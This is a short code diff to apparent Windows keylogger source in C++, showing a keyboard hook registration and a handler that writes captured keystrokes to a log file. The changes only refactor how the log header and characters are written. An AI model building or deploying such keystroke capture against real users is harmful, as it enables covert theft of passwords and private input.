@@ -8,12 +8,12 @@ HHOOK g_hook;
 Keyboard g_kbd;
 
 void InitKeyLogger() {
-    std::stringstream ss;
-    ss << "\n\n*********************************\n*Log created "
-        << GetCurrentDateTimeAsFormatedString() 
-        << "*\n*********************************" << std::endl;
-    FileLogger::Log(ss.str());
+    auto str = "\n\n*********************************\n*Log created " + 
+                GetCurrentDateTimeAsFormatedString() + 
+                "*\n*********************************\n";
 
+    FileLogger::Log(str);
+   
     RegisterHook();
     g_kbd.EnableAutorepeat();
 }
@@ -51,7 +51,7 @@ void HandleKeyStrokes() {
             FileLogger::Log(*keyStroke);
         }
         else {
-            FileLogger::Log(std::string{ static_cast<char>(e->GetCode()) }.append("\\"));
+            FileLogger::Log({static_cast<char>(e->GetCode())});
         }
     }
 }
